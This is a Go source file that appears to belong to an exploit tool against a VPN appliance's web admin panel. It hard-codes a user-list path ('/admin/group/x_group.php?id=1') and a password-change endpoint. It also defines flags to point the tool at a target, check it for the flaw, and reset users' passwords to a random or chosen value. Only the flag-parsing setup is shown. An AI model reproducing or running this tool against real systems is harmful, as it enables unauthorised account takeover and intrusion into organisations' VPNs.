package module

import (
	"flag"
	"fmt"
	"log"
	"net/url"
)

var (
	V                  vpnConnect
	getUserListPath    = "/admin/group/x_group.php?id=1"
	changePasswordPath = "/changepass.php?type=2"
	password           string
)

func (v *vpnConnect) init() {
	flag.StringVar(&v.target, "u", "", "target you want fuck.(example:https://xxxxx:xxx)")
	flag.IntVar(&v.timeout, "t", 5, "request timeout default is 5 second.")
	flag.BoolVar(&v.check, "c", true, "check target vuln.(default)")
	flag.BoolVar(&v.change, "e", false, "change user's password.")
	flag.StringVar(&password, "p", v.generatePassword(), "manual set password you want change.(default is generate by random.)")
	flag.Parse()
	v.isVul = false
	if v.target == "" {
		log.SetPrefix("[-] ")
		log.Fatalln("give me a valid target url")
	} else {
		u, err := url.Parse(v.target)
		if err != nil {
			log.SetPrefix("[-] ")
			log.Fatalln(err)
		}
		v.target = fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	}
}
